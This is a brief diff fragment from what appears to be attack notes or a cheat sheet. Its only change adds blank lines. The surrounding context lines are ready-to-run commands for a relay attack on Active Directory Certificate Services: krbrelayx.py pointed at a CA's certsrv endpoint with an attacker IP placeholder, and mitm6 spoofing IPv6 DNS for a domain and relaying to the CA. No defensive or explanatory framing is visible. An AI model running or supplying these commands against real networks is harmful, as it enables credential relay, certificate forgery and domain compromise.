@@ -18,3 +18,5 @@ sudo krbrelayx.py --target http://CA/certsrv -ip attacker_IP --victim target.dom
 # Run mitm6
 sudo mitm6 --domain domain.local --host-allowlist target.domain.local --relay CA.domain.local -v
 ```
+
+
